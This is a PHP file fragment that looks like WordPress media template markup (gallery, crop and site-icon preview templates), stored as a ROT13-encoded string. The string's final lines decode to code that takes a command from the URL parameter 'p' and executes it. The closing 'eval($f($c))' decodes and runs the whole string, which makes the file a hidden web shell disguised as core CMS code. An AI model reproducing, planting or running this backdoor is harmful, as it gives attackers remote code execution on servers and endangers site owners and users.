						<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax erzbir-frggvat erzbir-genpx\"><?cuc _rk( 'Erzbir ivqrb genpx', 'zrqvn' ); ?></ohggba><oe />
						<# } ); #>
					<# } ryfr { #>
					<fcna pynff=\"anzr\"><?cuc _r( 'Genpxf (fhogvgyrf, pncgvbaf, qrfpevcgvbaf, puncgref, be zrgnqngn)' ); ?></fcna><oe />
					<rz><?cuc _r( 'Gurer ner ab nffbpvngrq fhogvgyrf.' ); ?></rz>
					<# } #>
					<grkgnern pynff=\"uvqqra pbagrag-frggvat\">{{ pbagrag }}</grkgnern>
				</fcna>
			</qvi>
		</qvi>
	</fpevcg>

	<?cuc // Grzcyngr sbe n Tnyyrel jvguva gur rqvgbe. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-rqvgbe-tnyyrel\">
		<# vs ( qngn.nggnpuzragf.yratgu ) { #>
			<qvi pynff=\"tnyyrel tnyyrel-pbyhzaf-{{ qngn.pbyhzaf }}\">
				<# _.rnpu( qngn.nggnpuzragf, shapgvba( nggnpuzrag, vaqrk ) { #>
					<qy pynff=\"tnyyrel-vgrz\">
						<qg pynff=\"tnyyrel-vpba\">
							<# vs ( nggnpuzrag.guhzoanvy ) { #>
								<vzt fep=\"{{ nggnpuzrag.guhzoanvy.hey }}\" jvqgu=\"{{ nggnpuzrag.guhzoanvy.jvqgu }}\" urvtug=\"{{ nggnpuzrag.guhzoanvy.urvtug }}\" nyg=\"{{ nggnpuzrag.nyg }}\" />
							<# } ryfr { #>
								<vzt fep=\"{{ nggnpuzrag.hey }}\" nyg=\"{{ nggnpuzrag.nyg }}\" />
							<# } #>
						</qg>
						<# vs ( nggnpuzrag.pncgvba ) { #>
							<qq pynff=\"jc-pncgvba-grkg tnyyrel-pncgvba\">
								{{{ qngn.irevslUGZY( nggnpuzrag.pncgvba ) }}}
							</qq>
						<# } #>
					</qy>
					<# vs ( vaqrk % qngn.pbyhzaf === qngn.pbyhzaf - 1 ) { #>
						<oe fglyr=\"pyrne: obgu;\" />
					<# } #>
				<# } ); #>
			</qvi>
		<# } ryfr { #>
			<qvi pynff=\"jcivrj-reebe\">
				<qvi pynff=\"qnfuvpbaf qnfuvpbaf-sbezng-tnyyrel\"></qvi><c><?cuc _r( 'Ab vgrzf sbhaq.' ); ?></c>
			</qvi>
		<# } #>
	</fpevcg>

	<?cuc // Grzcyngr sbe gur Pebc nern ynlbhg, hfrq sbe rknzcyr va gur Phfgbzvmre. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-pebc-pbagrag\">
		<vzt pynff=\"pebc-vzntr\" fep=\"{{ qngn.hey }}\" nyg=\"<?cuc rfp_ngge_r( 'Vzntr pebc nern cerivrj. Erdhverf zbhfr vagrenpgvba.' ); ?>\" />
		<qvi pynff=\"hcybnq-reebef\"></qvi>
	</fpevcg>

	<?cuc // Grzcyngr sbe gur Fvgr Vpba cerivrj, hfrq sbe rknzcyr va gur Phfgbzvmre. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-fvgr-vpba-cerivrj-pebc\">
		<fglyr>
			:ebbg{
				--fvgr-vpba-hey: hey( \"{{ qngn.hey }}\" );
			}
		</fglyr>
		<u2><?cuc _rk( 'Fvgr Vpba Cerivrj', 'abha' ); ?></u2>
		<c><?cuc _r( 'Nf na ncc vpba naq n oebjfre vpba.' ); ?></c>
		<qvi pynff=\"fvgr-vpba-cerivrj pebc\">
			<qvi pynff=\"vzntr-cerivrj-jenc ncc-vpba-cerivrj\">
				<vzt vq=\"cerivrj-ncc-vpba\" fep=\"{{ qngn.hey }}\" pynff=\"ncc-vpba-cerivrj\" nyg=\"<?cuc rfp_ngge_r( 'Cerivrj nf na ncc vpba' ); ?>\" />
			</qvi>
			<qvi pynff=\"fvgr-vpba-cerivrj-oebjfre\">
				<fit ebyr=\"vzt\" nevn-uvqqra=\"gehr\" svyy=\"abar\" kzyaf=\"uggc://jjj.j3.bet/2000/fit\" pynff=\"oebjfre-ohggbaf\"><cngu svyy-ehyr=\"rirabqq\" pyvc-ehyr=\"rirabqq\" q=\"Z0 20n6 6 0 1 1 12 0 6 6 0 0 1-12 0Mz18 0n6 6 0 1 1 12 0 6 6 0 0 1-12 0Mz24-6n6 6 0 1 0 0 12 6 6 0 0 0 0-12M\" /></fit>
				<qvi pynff=\"fvgr-vpba-cerivrj-gno\">
					<qvi pynff=\"vzntr-cerivrj-jenc oebjfre\">
						<vzt vq=\"cerivrj-snivpba\" fep=\"{{ qngn.hey }}\" pynff=\"oebjfre-vpba-cerivrj\" nyg=\"<?cuc rfp_ngge_r( 'Cerivrj nf n oebjfre vpba' ); ?>\" />
					</qvi>
					<qvi pynff=\"fvgr-vpba-cerivrj-fvgr-gvgyr\" nevn-uvqqra=\"gehr\"><# cevag( '<?cuc rpub rfp_wf( trg_oybtvasb( 'anzr' ) ); ?>' ) #></qvi>
						<fit ebyr=\"vzt\" nevn-uvqqra=\"gehr\" svyy=\"abar\" kzyaf=\"uggc://jjj.j3.bet/2000/fit\" pynff=\"pybfr-ohggba\">
							<cngu q=\"Z12 13.0607Y15.7123 16.773Y16.773 15.7123Y13.0607 12Y16.773 8.28772Y15.7123 7.22706Y12 10.9394Y8.28771 7.22705Y7.22705 8.28771Y10.9394 12Y7.22706 15.7123Y8.28772 16.773Y12 13.0607M\" />
						</fit>
					</qvi>
				</qvi>
			</qvi>
		</qvi>
	</fpevcg>

	<?cuc

	/**
	 * Sverf jura gur phfgbz Onpxobar zrqvn grzcyngrf ner cevagrq.
	 *
	 * @fvapr 3.5.0
	 */
	qb_npgvba( 'cevag_zrqvn_grzcyngrf' );
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>